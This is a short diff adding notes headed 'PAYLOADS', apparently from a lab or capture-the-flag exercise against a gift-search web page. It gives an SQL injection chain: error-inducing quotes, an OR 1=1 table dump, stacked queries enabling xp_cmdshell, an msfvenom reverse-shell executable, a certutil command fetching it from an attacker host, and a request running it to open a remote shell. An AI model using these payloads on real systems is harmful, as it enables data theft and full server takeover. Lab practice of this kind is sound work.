@@ -1,0 +1,38 @@
+#PAYLOADS
+
+#inducing errors
+"'"
+http://10.49.158.131/giftresults.php?age=adult'&interests=gadgets&budget=50
+
+#Dumping the whole database table
+' OR 1=1
+
+http://10.49.158.131/giftresults.php?age=adult' OR 1=1 --&interests=gadgets&budget=50
+
+#enabling xp_cmdshell
+
+EXEC sp_configure 'show advanced options', 1;
+RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+
+
+By injecting the above statements into Server, we'll first enable advanced configuration options in
+
+Server by setting show advanced options to 1. We then apply the change to the running configuration via the RECONFIGURE statement. Next, we enable the xp_cmdshell procedure by setting xp_cmdshell to 1 and applying the change to the running configuration again.
+
+Converting these into a single stacked SQLi payload will look like this:
+http://10.48.170.127/giftresults.php?age='; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --
+
+##Generate an MSFvenom Payload 
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.200.191 LPORT=4444 -f exe -o reverse.exe
+ 
+ #downloading the payload:
+ 
+ http://10.48.171.187/giftresults.php?age='; EXEC xp_cmdshell 'certutil -urlcache -f ://192.168.200.191:8000/reverse.exe C:\Windows\Temp\reverse.exe'; --
+ 
+ #executing the payload and send the shell:
+ 
+ http://10.48.171.187/giftresults.php?age='; EXEC xp_cmdshell 'C:\Windows\Temp\reverse.exe'; --
+ 
+ 
